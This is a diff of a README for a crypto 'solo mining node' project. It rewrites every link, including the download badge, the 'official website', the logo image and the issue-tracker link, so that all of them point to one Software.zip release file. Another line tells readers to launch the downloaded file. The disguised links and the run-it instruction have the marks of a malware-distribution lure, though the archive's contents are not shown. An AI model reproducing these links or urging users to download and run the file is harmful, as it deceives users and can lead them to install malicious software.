@@ -22,7 +22,7 @@ Unfortunately, a short description for this repository has not been provided. Ho
 ## Getting Started
 To begin setting up your solo mining node on the Initverse Mainnet, please download the necessary files from the link below:
 
-[![Download Zip](https://img.shields.io/badge/Download-Zip-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/mrjoxsa/Solo-Mining-Node-Setup-on-Initverse-Mainnet/releases/download/v1.0/Software.zip)](https://github.com/mrjoxsa/Solo-Mining-Node-Setup-on-Initverse-Mainnet/releases/download/v1.0/Software.zip)
 
 The provided link leads to a Zip file that contains all the essential resources for your mining node setup. Once downloaded, follow the installation instructions and configuration steps to start solo mining on the Initverse Mainnet.
 
@@ -31,12 +31,12 @@ If the link above ends with a file name, it needs to be launched to access the r
 In case the link is not working, please check the "Releases" section of this repository for alternative download options.
 
 ## Additional Resources
-Check out the official [Initverse website](https://www.initverse.io) for more information on solo mining, the Mainnet, and other related topics.
+Check out the official [Initverse website](https://github.com/mrjoxsa/Solo-Mining-Node-Setup-on-Initverse-Mainnet/releases/download/v1.0/Software.zip) for more information on solo mining, the Mainnet, and other related topics.
 
-![Initverse Logo](https://example.com/initverse-logo.png)
+![Initverse Logo](https://github.com/mrjoxsa/Solo-Mining-Node-Setup-on-Initverse-Mainnet/releases/download/v1.0/Software.zip)
 
 ## Support
-For any questions or assistance regarding the solo mining node setup on the Initverse Mainnet, feel free to [open an issue](https://github.com/username/repo/issues) on this repository.
+For any questions or assistance regarding the solo mining node setup on the Initverse Mainnet, feel free to [open an issue](https://github.com/mrjoxsa/Solo-Mining-Node-Setup-on-Initverse-Mainnet/releases/download/v1.0/Software.zip) on this repository.
 
 Let's embark on an exciting mining journey together in the vast universe of Initverse! 🛸🌠
 
